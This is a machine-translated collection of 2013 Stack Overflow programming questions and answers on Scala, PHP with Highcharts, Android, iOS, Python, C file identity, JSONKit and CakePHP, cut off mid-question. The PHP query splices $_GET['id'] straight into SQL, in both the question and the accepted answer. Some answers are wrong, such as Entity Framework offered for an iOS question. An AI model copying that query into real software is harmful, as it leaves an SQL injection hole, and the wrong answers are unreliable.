我创建了一个名为 Forum.php 的 wordpress 模板页面，其中我有 iframe 可以访问 http:// 网站。com/论坛/

我应用 forum.php 模板的 wordpress 页面是 http:// 网站。com/forum/ 注意小 f。

因此，当您访问[http://website.com/forum/](http://website.com/forum/)时，它会加载具有 iframe ID=frmid 和 src= [http://website.com/Forum/的 forum.php](http://website.com/Forum/)

我如何将我的链接注入 http:// 网站。com/forum/ (forum.php iframe ID=frmid) 并无缝加载？

# scala - scala谓词基本

> ID：15650462
> 
> 赞同：1
> 
> 时间：2013-03-27T01:27:54.480
> 
> 标签：scala

我对 scala 很陌生，所以你可以原谅我这个基本的新手问题。我有以下代码片段。

```
type Pred[A, B] = (A, B) => Int;
def abs[A, B](p: (A, B) => Int): (A, B) => Int =
  (a, b) => if (p(a, b) < 0) -(p(a, b)) else (p(a, b));
def multiply(a: Int, b: Int): Int =
  a * b;
def subtract(a: Int, b: Int): Int =
  a - b;

val absMultiply = abs(multiply);
val absSubstract = abs(subtract);

println("abs(10 * 10) = " + absMultiply.apply(10, 10));
println("abs(10 - 100) = " + absSubstract.apply(10, 100)); 
```

因此，正如我正确理解的那样，应该可以将 (A,B) => Int 替换为 Pred[A, B]。

```
def abs[A, B](p: Pred[A, B]): Pred[A, B] =
  (a, b) => if (p(a, b) < 0) -(p(a, b)) else (p(a, b)); 
```

但后来我得到一个编译器异常

```
type mismatch;  found   : (Int, Int) => Int  required: (A, B) => Int    
type mismatch;  found   : (Int, Int) => Int  required: (A, B) => Int 
```

我误解这里有什么问题吗？

非常感谢您的帮助。

西里尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T03:14:54.883

如果您将 A 和 B 声明为逆变类型，它会起作用：

```
type Pred[-A, -B] = (A, B) => Int 
```

这是必要的，因为`multiply`和`subtract`函数被视为 Pred[A, B] 的子类型，它们的参数必须是 A 和 B 的超类型。有关该主题的出色解释，请参[见此](https://stackoverflow.com/a/674090/196068)答案。

# php - Highcharts 对具有相同日期的结果求和

> ID：15650474
> 
> 赞同：0
> 
> 时间：2013-03-27T01:30:09.317
> 
> 标签：php, javascript, jquery

我已经在我的网站上安装了 Highcharts，但我遇到了问题。MySQL 返回该值中的数据：

```
['26.03.2013', 1], ['26.03.2013', 1], ['26.03.2013', 1], ['26.03.2013', 1], ['26.03.2013', 1], ['11.03.2013', 1], ['21.03.2013', 1], ['22.03.2013', 1] 
```

它包含在 Highcharts 中，如下所示：

```
$('#chart').highcharts({
    chart: {
        type: 'line'
    },
    title: {
        text: 'Statistika prenosov'
    },
    xAxis: {
        title: {
            text:'Datum'
        }
    },
    yAxis:{
        title: {
            text:'Prenosi'
        },
        plotLines: [{
            value: 0,
            width: 1,
            color: '#808080'
        }]
    },

   series: [{
            name: 'Prenosi',
            data: [['26.03.2013', 1], ['26.03.2013', 1], ['26.03.2013', 1], ['26.03.2013', 1], ['26.03.2013', 1], ['11.03.2013', 1], ['21.03.2013', 1], ['22.03.2013', 1]]
        }]
    });

}); 
```

但我想，如果有 26.3.2013 三个日期，那么不要单独显示它们，而是将它们放在一起，所以结果应该是 3，而不是 3x1。

下面是我如何使用 PHP 获取结果：

```
$query=mysql_query("SELECT * FROM downloads WHERE prjID='".$_GET['id']."' ORDER BY date ASC");
$num=mysql_num_rows($query);
$res='';
$i=0;
while($row=mysql_fetch_array($query)){

$i++;
$date=date("d.m.Y", strtotime($row['date']));

$numb=1;

if($i!=$num){
$res.="['".$date."', ".$numb."], ";
}
else{
$res.="['".$date."', ".$numb."]";
}

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T08:36:11.180

最简单的事情是修改你的 SQL 来为你总结。如果您尝试显示每个日期的计数，请将查询更改为：

```
SELECT date,count(*) as num FROM downloads WHERE prjID='".$_GET['id']."' GROUP BY date ORDER BY date ASC" 
```

# java - AGPS 设置加载而不是位置和安全

> ID：15650476
> 
> 赞同：1
> 
> 时间：2013-03-27T01:30:22.053
> 
> 标签：java, android, gps

我有一个简单的 if 语句检查来确定我的应用程序上是否打开了 GPS。

这在模拟器上完美运行，但是当安装在实际设备上而不是按意图调用加载“位置和安全”菜单时，它正在加载 AGPS 选项。此菜单不允许我打开 GPS，我必须手动导航到“位置和安全”菜单。

这是我的 alertDialog 构建器代码。如图所示，使用意图调用“ACTION_LOCATION_SOURCE_SETTINGS”。

```
alertDialog.setPositiveButton("Settings",
            new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    Intent intent = new Intent(
                            Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                    startActivity(intent);
                }
            }); 
```

为了进一步突出问题，请使用以下屏幕截图：

这是我想通过我的意图加载的屏幕：

![在此处输入图像描述](../Images/090a3805f853dba66b33eb4d7147251f.png)

当前正在加载的菜单：

![在此处输入图像描述](../Images/93bfb43974e2ef7dd418cee10a3491da.png)

如何让我的意图加载第一个菜单而不是第二个？

# windows-8 - 在 Blend for VS 2012 中设计 Win 8 Wire 框架

> ID：15650480
> 
> 赞同：1
> 
> 时间：2013-03-27T01:30:48.897
> 
> 标签：windows-8, expression-blend, wireframe

我正在尝试为 Win 8 创建线框，并且我正在使用 Blend 以使线框尽可能接近实际应用程序。

是否有任何简短的快速入门指南可供我阅读以开始在 Blend 中设计 UI？

我在网上搜索了谷歌，但其中大多数对如何设计 UI 的描述非常模糊。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T12:11:15.003

通常你会使用一些东西作为草图流来创建你的线框，但这不适用于 Windows 商店。仅适用于 WPF、Silverlight 和 Windows Phone（[phone req. 从 codeplex 下载](http://wp7sketchflow.codeplex.com/)）。

要创建线框，您需要使用其他工具，例如 Microsoft Powerpoint。但请注意，要做到这一点，您可以使用以下 Visual Studio 版本之一在 Powerpoint 中创建线框：

*   Visual Studio Ultimate
*   Visual Studio 高级版
*   Visual Studio 测试专家。

如果您想使用 PowerPoint 进行线框图；查看此[Microsoft 指南](http://msdn.microsoft.com/en-us/library/hh409276%28v=vs.110%29.aspx)

**提示：**如果使用 Powerpoint：如果你在 Visual Studio Gallery 中搜索“storyboard”，你会发现那里有很多形状。画廊和搜索的链接在[这里](http://visualstudiogallery.msdn.microsoft.com/site/search?query=Storyboard&f%5B0%5D.Value=Storyboard&f%5B0%5D.Type=SearchText&f%5B1%5D.Value=Storyboard%20Shapes%20Team%20%28Microsoft%20Corporation%29&f%5B1%5D.Type=User&f%5B1%5D.Text=Storyboard%20Shapes%20Team%20%28Microsoft%20Corporation%29&ac=8)。

您仍然可以使用 Blend 来创建一些模型。您只需将控件拖到屏幕上并开始布局您的应用程序。然而，这*不是*线框图，这实际上是在构建应用程序的原型，而不是做你的线框图，这是另一回事。您仍然可以仅使用 Blend 和屏幕右侧的属性面板来创建内容。

在 Windows 应用商店应用程序的通用设计门户上有大量可用的材料：http: [//design.windows.com](http://design.windows.com)

如果您希望线框看起来尽可能**接近**真实交易，而不是实际构建它，我建议您在 Adob​​e Illustrator 或 Adob​​e Photoshop 中制作线框。这里有很多可用于[设计屏幕的资产](http://msdn.microsoft.com/en-US/library/windows/apps/hh700403)

# c# - 如何加载夹在精灵上的精灵表，不包括背景？

> ID：15650481
> 
> 赞同：1
> 
> 时间：2013-03-27T01:30:53.633
> 
> 标签：c#, xna

我在谷歌上搜索时遇到了很多麻烦，因为我真的不知道它的术语。不过，这必须是一个普遍的问题。我想遍历一个精灵表，但我希望它忽略精灵周围的透明背景，而不是将其作为显示内容的一部分。

例如，如果我有几帧，我想遍历每一帧并加载该图像。然后，在那个框架中，我想通过在图像本身周围绘制一个矩形来缩小它，而不是额外的“背景”。这可能会通过找到不透明像素的精灵角来完成（不确定这部分是如何工作的）。

这有意义吗？再次，不确定在这里使用哪些词......如果不清楚，请告诉我。

这里的目标是加载与其他帧完全一致的精灵，这样它们就不会无意中摆动或反弹。

非常感谢！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T17:13:46.210

我也在开发我的第一款游戏，我的精灵周围的透明区域也有类似的问题，在这种情况下是碰撞。

我所做的是设置它，使每个精灵都有一个位置、一个高度、一个宽度和 X 和 Y 的填充。

```
Vector2 position = new Vector2(100,100);
int frameHeight = 48;
int frameWidth = 48;
int paddingX = 4;
int paddingY = 3; 
```

有了这些信息，您可以获得所需的信息，例如代表我可以使用的精灵周围的边界框的矩形：

```
boundingRectangle = new Rectangle(
  (int)position.X + paddingX, 
  (int)position.Y + paddingY, 
  frameWidth - (paddingX * 2), 
  frameHeight - (paddingY * 2)); 
```

我在 Kurt Jaegers 的 XNA 4.0 Game Development by Example 中读到了这篇文章（这对我有很大帮助）

# ios - 克隆interfacebuilder中定义的uiview？

> ID：15650482
> 
> 赞同：1
> 
> 时间：2013-03-27T01:31:00.760
> 
> 标签：ios, uiview, interface-builder

我在界面构建器中创建了一个 UIView，它是滚动视图的子视图。UIView 包含一个按钮和一个标签。我想将此视图用作千篇一律的工具，以便我可以生成此视图的各种实例，这些实例在滚动视图中彼此相邻

我可以以编程方式执行此操作，但这意味着我必须以编程方式以编程方式定义视图大小和子视图，我更愿意在界面构建器中定义视图的一个实例，以便我可以将其布局，然后以编程方式创建该视图的副本. 目标是尽可能使用 interfacebuilder 来定义布局，以减少我需要编写的代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:42:24.160

我创建了一个 UIView 类别来处理这个问题。

```
@interface UIView (JLTDeepClone)
- (id)deepClone;
@end

@implementation UIView (JLTDeepClone)
- (id)deepClone
{
    NSMutableData *data = [NSMutableData data];

    NSKeyedArchiver  *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:self forKey:@"view"];
    [archiver finishEncoding];

    NSKeyedUnarchiver  *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:data];
    UIView *result = [unarchiver decodeObjectForKey:@"view"];
    [unarchiver finishDecoding];

    return  result;
}
@end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:32:54.750

看看 Entity Framework，这听起来像是您正在寻找的东西，应该有助于减少代码行数

[http://msdn.microsoft.com/en-US/data/ef](http://msdn.microsoft.com/en-US/data/ef)

# python - 在 python 3 中使用地图

> ID：15650485
> 
> 赞同：1
> 
> 时间：2013-03-27T01:31:22.047
> 
> 标签：python

嗨，这段代码适用于 python 2.7，但不适用于 python 3

```
import itertools
def product(a,b):
    return map(list, itertools.product(a, repeat=b)
print(sorted(product({0,1}, 3))) 
```

它输出

```
 [[0, 0, 0], [0, 0, 1], [0, 1, 0], [0, 1, 1], [1, 0, 0], [1, 0, 1], [1, 1, 0], [1, 1, 1]] 
```

在 python 2.7 中，但在 python 3 中，它在 0x028DB2F0 处提供地图对象，有人知道如何更改它以适用于 python 3，因此输出与 python 2.7 中的输出保持相同

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:34:56.013

只需以这种方式将其包装为列表：

```
import itertools

def product(a,b):
    return list(map(list, itertools.product(a, repeat=b))

print(sorted(product({0,1}, 3))) 
```

在 Python 3.x[中获取 map() 以返回列表](https://stackoverflow.com/questions/1303347/getting-a-map-to-return-a-list-in-python-3-1)

Python 3 map 中的两个词

> 返回一个迭代器，它将函数应用于可迭代的每个项目，产生结果。

在 python 2.7 中

> 将函数应用于可迭代的每个项目并返回结果列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:35:41.627

在 Python 3 中，`map()`内置函数返回一个迭代器而不是一个列表，其行为有点像 Python 2`itertools.imap()`函数。

如果你需要一个列表，你可以简单地将该迭代器传递给`list()`. 例如：

```
>>> x = map(lambda x: x + 1, [1, 2, 3])
>>> x
<map object at 0x7f8571319b90>
>>> list(x)
[2, 3, 4] 
```

# javascript - icanhaz/mustache 循环（遍历元素）js 错误

> ID：15650487
> 
> 赞同：0
> 
> 时间：2013-03-27T01:31:30.967
> 
> 标签：javascript, jquery, templates, mustache, icanhaz.js

我正在尝试使 icanhaz/mustache 循环正常工作，如本[答案](https://stackoverflow.com/a/8538476/769384)中所定义，并且在浏览器控制台中出现以下错误：

```
Uncaught Error: Syntax error, unrecognized expression: <option value="1">First</option>
                        <option value="2">Second</option> 
```

不知道为什么。我刚刚设法发现这是导致问题的行：

```
ich.myTemplate(listOfStuff); 
```

这是我的全部代码：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/tr/html4/transitional.dtd">
<html>
    <head>
        <title>icanhaz.js demo</title>
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" ></script>
        <script type="text/javascript" src="https://raw.github.com/HenrikJoreteg/ICanHaz.js/master/ICanHaz.js"></script>
    </head>
    <body>

    <select id="mySelectBox">
    </select>

    <script id="myTemplate" type="text/html">
        {{#stuff}}
        <option value="{{key}}">{{desc}}</option>
        {{/stuff}}
    </script>

    <script>
        $(document).ready( function() {

            var listOfStuff = {stuff: [ 
                    {key: "1", desc: "First"},
                    {key: "2", desc: "Second"}
                ]};
            var x = ich.myTemplate(listOfStuff);
            $("#mySelectBox").append(x);
        });
    </script>

</body>
</html> 
```

感谢您的任何建议！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T21:51:32.177

最后我发现了错误。这是 jquery 版本问题 - 1.9.1 返回错误而 1.8.3 没有。比较这些演示：

*   [http://tinyurl.com/cb48wb9](http://tinyurl.com/cb48wb9) - jquery 1.9.1
*   [http://tinyurl.com/bnf4xld](http://tinyurl.com/bnf4xld) - jquery 1.8.3

对于 1.9.1 版本，请查看 javascript 控制台。

此外，如果我改变了

```
<script id="myTemplate" type="text/html">
    {{#stuff}}
    <option value="{{key}}">{{desc}}</option>
    {{/stuff}}
</script> 
```

至

```
<script id="myTemplate" type="text/html">
    {{#stuff}}<option value="{{key}}">{{desc}}</option>{{/stuff}}
</script> 
```

对于 1.9.1，它也运行良好。

* * *

**编辑：这是[icanhaz/github 上](https://github.com/HenrikJoreteg/ICanHaz.js/issues/58)的一个未解决的问题。如果您愿意，请帮助修复此错误！**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T05:45:32.707

```
var listOfStuff = {stuff: [ 
                  {key: "1", desc: "First"},
                  {key: "2", desc: "Second"}
              ]};
var html = ich.myTemplate(listOfStuff);
$("#mySelectBox").append($(html)); 
```

试试看？

# c - 确定两个文件路径是否指向Linux / C下的同一个文件？

> ID：15650488
> 
> 赞同：8
> 
> 时间：2013-03-27T01:31:31.747
> 
> 标签：c, linux, filesystems, stat

在 Linux 下，我有两个文件路径 A 和 B：

```
const char* A = ...;
const char* B = ...; 
```

我现在想确定，我应该`open(2)`他们俩...

```
int fda = open(A, ...);
int fdb = open(B, ...); 
```

...我会在文件系统中打开同一个文件的两个文件句柄吗？

为了确定这一点，我想到了`stat(2)`：

```
struct stat
{
    dev_t st_dev;
    ino_t st_ino;
    ...
} 
```

类似（伪代码）：

```
bool IsSameFile(const char* sA, const char* sB)
{
    stat A = stat(sA);
    stat B = stat(sB);

    return A.st_dev == B.st_dev && A.st_ino == B.st_ino;
} 
```

是否存在 A 和 B 是同一个文件但`IsSameFile`返回 false 的情况？

是否存在 A 和 B 是不同文件但`IsSameFile`会返回 true 的情况？

有没有更好的方法来做我想做的事情？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T01:49:00.807

您的程序在所有情况下都可以正常工作，因为`A.st_ino`将返回系统中文件的**inode 编号**。由于 inode 编号是唯一的，您的程序将正确识别打开的两个文件是否相同。

您还可以检查 的值`A.st_mode`以确定文件是否为**符号链接**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:03:19.037

这取决于您为什么要避免两次打开同一个文件。您的解决方案通常是正确的，但在某些情况下，如果文件具有相同的绝对路径，则应将其视为相同，但如果它们是指向同一 inode 的链接，则不应视为相同。在这种情况下，您需要将路径转换为绝对路径并进行比较...请参阅[获取文件的绝对路径](https://stackoverflow.com/questions/229012/getting-absolute-path-of-a-file)

您还需要决定是否考虑将符号链接指向与该文件等效的文件或另一个符号链接。对于 inode 等效性，它决定是否使用`stat`或`lstat`。对于路径等价，它决定了您是否可以使用`realpath`或者是否需要在不遵循符号链接的情况下获取绝对路径。

# iphone - JSONKit 给出解析错误，但 JSONLint.org 说它是有效的

> ID：15650489
> 
> 赞同：1
> 
> 时间：2013-03-27T01:31:34.490
> 
> 标签：iphone, ios, json, cocoa-touch, jsonkit

这是我的 post.json 文件：

```
[
    {
        "Title": "Introduction to WCF",
        "Url": "http://myaddress/videos/introduction-to-wcf",
        "Thumbnail": "http://myaddress/images/20110212_01.jpg",
        "Exceprt": "Introduction to WCF",
        "PostDate": "2011-02-12T14:26:07",
        "Id": 39,
        "Mp4Video": "http://myaddress/2012/05/20110212_01.mp4",
        "Speakers": [
            {
                "Name": "Mark Wilkinson",
                "Slug": "mark-wilkinson"
            }
        ],
        "Groups": [
            {
                "Name": "C# UG",
                "Slug": "cs-ug"
            }
        ],
        "Tags": [
            {
                "Name": "WCF Services",
                "Slug": "wcf-services"
            }
        ]
    }
] 
```

在 jsonlint.org 中发布它并验证。

这是我一直用于其他有效的 JSON 文件的代码：

```
- (void)test_can_read_from_groups_file_and_build_JSONDictionary {

    id result = [self data_from_JSON_file:@"post"];
    [Assert isNotNil:result];  // is returning as nil, so test is failing
}

- (id)data_from_JSON_file:(NSString *)fileName {

    NSBundle *bundle = [NSBundle bundleForClass:[self class]];
    NSString *jsonString = [bundle pathForResource:fileName ofType:@"json"];
    NSData *data = [NSData dataWithContentsOfFile:jsonString];
    JSONDecoder *decoder = [[JSONDecoder alloc] initWithParseOptions:JKParseOptionNone];

    NSError *error = nil;
    id result =  [decoder objectWithData:data error:&error];
    if (error) {
        NSLog(@"*********\r\r\r\r\r\r\r Error was: %@", [error localizedDescription]);
    }

    return result;
} 
```

从 JSONKit objectWithData 打印出的错误：

```
Error was: Unexpected token, wanted '{', '}', '[', ']', ',', ':', 'true', 'false', 'null', '"STRING"', 'NUMBER'. 
```

ETA：是的，它处于构建阶段：

![在此处输入图像描述](../Images/7e408c7a4dc3d614f339650275a0549a.png)

添加：

```
if (!data)
{
    NSLog(@"\r\r\r\r\r\r%s: data was nil", __FUNCTION__);
    return nil;
} 
```

它没有触及这个分支，所以数据不是零。

使用 JSONKit 解码器更改为：

```
id results = [NSJSONSerialization JSONObjectWithData:data
                                                 options:kNilOptions error:&error]; 
```

并且它有效，仍然对为什么 JSONKit 对我失败但对 Rob 失败感到困惑。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:53:35.280

正如 pst 指出的那样，问题原来是[BOM](https://stackoverflow.com/a/2223926/1271826)。在 Xcode 中，如果您右键单击文件名，选择“Open As”并选择“Hex”，您将看到：

![十六进制转储](../Images/eda4c9fdd110d6fea31999dfe5349409.png)

前三个字符显然不是标准的文本字符。幸运的是，您可以在 Xcode 的十六进制编辑器中突出显示这三个字符，删除它们，保存文件，现在应该可以修复它了。

* * *

原答案：

另外，您确定 JSON 包含在您的捆绑包中吗（检查“目标设置”的“构建阶段”中的“复制捆绑资源”）。我只是用 Cocoa 标准 JSON 解析类解析了您的 JSON `NSJSONSerialization`，没有发生意外。也许您应该尝试检查`data`并确保一切正常：

```
NSLog(@"data=%@", [[[NSString alloc] initWithData:data] autorelease]); 
```

但是我解析了你的 JSON`JSONKit`并且`NSJSONSerialization`没有发生任何事件。

```
NSString *filename = [[NSBundle mainBundle] pathForResource:@"test" ofType:@"json"];
NSData *data = [NSData dataWithContentsOfFile:filename];
if (!data)
{
    NSLog(@"%s: data was nil", __FUNCTION__);
    return;
}
JSONDecoder *decoder = [[JSONDecoder alloc] initWithParseOptions:JKParseOptionNone];
NSError *error = nil;
id results =  [decoder objectWithData:data error:&error];

//  Also tested with NSJSONSerialization
//
//    id results = [NSJSONSerialization JSONObjectWithData:data
//                                                 options:0
//                                                   error:&error];

if (!error)
    NSLog(@"%s: results = %@", __FUNCTION__, results);
else
    NSLog(@"%s: error = %@", __FUNCTION__, error); 
```

# cakephp-2.0 - cakephp 为相关模型的相关模型保存数据（不是拼写错误）

> ID：15650490
> 
> 赞同：-2
> 
> 时间：2013-03-27T01:31:43.183
> 
> 标签：cakephp-2.0, models, saving-data

我在 cake php 中保存数据时遇到了一些问题。

这是模型/关系。

*   **区**有许多**部门**
*   **部门**有很多**组**

我正在考虑创建新区，其中我允许用户创建多个新部门。在创建每个部门时，用户可以为该部门创建多个组。现在的问题是我不确定如何保存组数据。

对于动态创建的每个部门，我使用输入的多索引方法（即“Department.0.name”，Department.0.type），因此使用 saveAll 方法保存将是一个小问题。但是，对于创建的每个组，我都需要一个部门 ID，并且由于尚未保存该地区的部门，因此它们没有 ID。我怎样才能保存这个新区的数据，保存新部门，以及他们相关的新创建的组？有没有一种方法可以解决组输入的名称属性，以创建正确的关联，例如“Department.0.Group.0.name”？

提前致谢！！！如果有什么不清楚的地方，请不要犹豫，说出来，我很乐意改写。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:36:45.890

您的 POST 数据数组是什么样的？

```
<?php

debug($this->data);

?> 
```

如果格式不正确，关联的模型将不会被保存。Cake 知道抓取尚未保存的模型的“lastInsertId()”，所以你不必担心那些...我不确定，文档并没有真正进入，是保存的深度。提供的示例如下：

```
$this->data =
Array
(
    [Article] => Array
        (
            [title] => My first article
        )
    [Comment] => Array
        (
            [0] => Array
                (
                    [comment] => Comment 1
                    [user_id] => 1
                )
            [1] => Array
                (
                    [comment] => Comment 2
                    [user_id] => 2
                )
       )
)

$this->Article->saveAll($this->data); 
```

这是保存“hasMany”关系的关联模型的正确结构（cakephp 1.3），但我不确定它是否比一个孩子更深。

我想到的一件事是根据上面的格式构建数组，但将父模型排除在外。然后手动保存父模型数据，抓取::getLastInsertId(); 然后对部门和组执行 saveAll。

* * *

[**更新**]我刚刚测试了你的理论，它会按照你想要的方式工作。

```
<?php

echo $this->Form->input('Department.0.Group.0.name');

?> 
```

将产生：

```
<input name="data[Department][0][Group][0][name]" type="text" id="Department0Group0name"> 
```

[**更新 2** ] 我在 lib/Cake/Model/Model.php 中做了一些探索，发现了这个：

```
<?php
...

public function saveAssociated($data = null, $options = array()) {
    ...
    ... // code omitted.
    ...
    if ($options['deep']) {  // This will recurse infinitely through all associations
        $saved = $this->{$association}->saveAssociated($values, array_merge($options, array('atomic' => false)));
    }
    ...
    ...
    ... // code omitted.
...
?> 
```

# java - Android doInBackground 停止

> ID：15650492
> 
> 赞同：0
> 
> 时间：2013-03-27T01:31:43.887
> 
> 标签：java, android, networking, wifi, adb

我在两个安卓设备之间有一个网络，一个设备只会发送一个块的位置，然后连接到手机的客户端将使用这些位置来显示块，主机可以移动块，客户端可以看到这个，但是在随机的时间后，连接就会断开，但我不确定它是连接还是 doInBackground 方法。

这是引起我问题的方法

```
@Override
protected Object doInBackground(Object... params)
{
    setUpClient();
    if( host == true ) { server.execute(); }
    rdyForPlay = true;
    boolean run = true;
    while( run )
    {
        //Tell the server to give position of players
        if( host == false)
        {
            Log.d(TAG, "Running client doInBackgroundMethod");
            try {
                if(socket == null)
                {
                    socket = new DatagramSocket( port );
                }
                byte[] bufer = new byte[256];
                String msg = "position";
                int msgLength = msg.length();
                bufer = msg.getBytes();
                InetAddress address;
                address = InetAddress.getByName("192.168.1.59");
                DatagramPacket p = new DatagramPacket( bufer, bufer.length , address, port );
                socket.send( p );

            } catch (UnknownHostException e2) {
                // TODO Auto-generated catch block
                e2.printStackTrace();
            } catch (SocketException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            byte[] buf = new byte[256];
            DatagramPacket packet = new DatagramPacket( buf, buf.length );
            try 
            {
                socket.receive( packet );
            } 
            catch (IOException e) 
            {
                Log.d(TAG, "Error with receiving data");
                e.printStackTrace();
            }

            String data = new String( buf, 0, packet.getLength() );
            Log.d(TAG, "Data received is in run method:" + data);
            //Take the data from the server and use it
            String[] pos = data.split(":");
            assets.get(0).setPosition( Integer.parseInt( pos[0] ), Integer.parseInt( pos[1] ) );
            //ID = Integer.parseInt( data );
        }
    }
    return null;
} 
```

如果需要，可以提供更多代码。

帆布

# iphone - 为什么 VideoPlayerViewController 可以从 iPad 呈现，但不能从 iPhone 呈现？

> ID：15650497
> 
> 赞同：0
> 
> 时间：2013-03-27T01:31:58.247
> 
> 标签：iphone, ios, ipad

我有一个通用应用程序和 2 个故事板（适用于 iPad 和 iPhone）。在视图控制器中，当我点击一个按钮时，视频开始播放。我正在这样做：

```
-(void)playMoviesForItems:(NSArray *)shopItems{
    VideoPlayerViewController* moviePlayer = [self.storyboard instantiateViewControllerWithIdentifier:@"videoPlayerController"];
    [self presentViewController:moviePlayer animated:NO completion:nil];
    [moviePlayer playMoviesForItems:shopItems];
} 
```

在 iPad 中，一切正常。但在 iPhone 中，我可以听到电影的声音，但没有视图。它不像 iPad 中那样呈现。

那么我错在哪里？这是展示视频控制器的好方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T10:48:14.963

我认为您的视频播放器框架设置不正确。您必须使用适当的类或像当前模态视图控制器一样。我可以使用视频播放器在 iphone 中播放视频。为什么它对您不起作用？是苹果做垃圾改变我希望不是这样..

# wcf - WCF 错误 未提供客户端证书。在 ClientCredentials 中指定客户端证书

> ID：15650502
> 
> 赞同：13
> 
> 时间：2013-03-27T01:33:07.973
> 
> 标签：wcf, wshttpbinding

我正在尝试调用 WCF 服务。我创建了一个自签名证书并安装在我的 localmachine \personnal \certificates 中，并且我在我的部分中添加了它。但我不明白为什么会出现这个错误。

这是我的 web.config

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <system.serviceModel>
        <bindings>
            <wsHttpBinding>
                <binding name="wsHttpEndpoint">
                    <security mode="Transport">
                        <transport clientCredentialType="Certificate" />
                    </security>
                </binding>
            </wsHttpBinding>
        </bindings>
        <client>
            <endpoint address="https://abcdxyz.abc.syntax.com/TestCCService.svc"
                binding="wsHttpBinding" bindingConfiguration="wsHttpEndpoint"
                contract="TestCCService.ITestCCService" name="wsHttpEndpoint" />
        </client>

        <behaviors>
            <endpointBehaviors>
                <behavior name="CustomBehavior">
                    <clientCredentials>
                        <clientCertificate findValue="abc.mymachine.name.com" x509FindType="FindBySubjectName"
                          storeLocation="LocalMachine" storeName="My" />
                        </clientCredentials>
                </behavior>
            </endpointBehaviors>
        </behaviors>

    </system.serviceModel>
</configuration> 
```

但是当我尝试调用我的服务方法时，它会抛出错误“未提供客户端证书。在 ClientCredentials 中指定客户端证书。”

感谢您解决此错误的建议？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-27T16:31:22.270

我忘了包括 behaviorConfiguration="CustomBehavior"

```
<endpoint address="https://abcdxyz.abc.syntax.com/TestCCService.svc"
                binding="wsHttpBinding" bindingConfiguration="wsHttpEndpoint"
                contract="TestCCService.ITestCCService" name="wsHttpEndpoint" **behaviorConfiguration="CustomBehavior"** /> 
```

及其现在的工作。

谢谢你的帮助

# bash - 如何在unix中打印出包含特定字符串的文件的所有行

> ID：15650506
> 
> 赞同：1
> 
> 时间：2013-03-27T01:33:15.037
> 
> 标签：bash, unix

我知道如何打印出第一次出现的字符串，但我不确定如何打印出所有出现的字符串。要打印出我使用过的第一次出现的字符串

```
grep ",1," my_course. 
```

我觉得打印出所有事件看起来像：

```
 while(file has next line)
         grep ",1," my_course 
```

不过，我不确定如何执行此 while 循环。如何测试文件是否有下一行。

编辑：对不起，我认为 grep 只匹配第一次出现。当我运行它时，它只匹配 1 行。我不知道只有 1 行匹配

另外，如果有人想回答，奖金问题......如果我的文件（my_course）中的所有行看起来像“数字，姓名，学时，等级”我将如何获得文件中的所有成绩并将其存储到数组中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T01:37:02.993

`grep`已经打印出所有事件。

从 grep 的[手册页](http://unixhelp.ed.ac.uk/CGI/man-cgi?grep)：

> grep, egrep, fgrep - 打印匹配模式的**行**

# ruby - # 有什么区别 和我的班级？

> ID：15650508
> 
> 赞同：1
> 
> 时间：2013-03-27T01:33:42.630
> 
> 标签：ruby, self

```
class MyClass
  def fun
    puts self
  end

  def self.fun2
    puts self
  end
end

mine = MyClass.new
mine.fun
MyClass.fun2 
```

上面的代码应该打印 self 两次，在这种情况下它们都是 MyClass。但是，实际输出是

```
#<MyClass:0x10f6a82d0>
MyClass 
```

它们有两种不同的形式。我想知道它们是否真的代表了不同的事物。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:38:32.900

`#<MyClass:0x10f6a82d0>`表示类的一个实例`MyClass`。 `MyClassf.fun2`返回类本身。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:38:35.610

第一个结果是MyClass*实例*的字符串表示，而第二个结果是 MyClass 类的字符串表示。

如果您制作了另一个`mine2 = MyClass.new`并打印了它，您将在最后得到一个不同的十六进制标识符，以将它与您的其他实例区分开来。

# jquery-ui - ajax调用后的jquery ui微调器

> ID：15650511
> 
> 赞同：0
> 
> 时间：2013-03-27T01:34:10.460
> 
> 标签：jquery-ui, jquery, delegates

我正在尝试在通过 ajax 调用动态插入的表单上使用 jquery ui 微调器。为了处理 ajax 调用，我依赖[ajaxy](http://balupton.github.com/jquery-ajaxy/demo/)。

成功后我这样调用这个函数：

```
response: function(){
    var Ajaxy = $.Ajaxy; var data = this.State.Response.data; var state = this.state;
    var State = this.State;
    var Action = this;
    Action.documentReady($content);

    updater(); // THE FUNCTION TO BIND NEW ELEMENTS

    return true;
}, 
```

这是功能

```
function updater(){
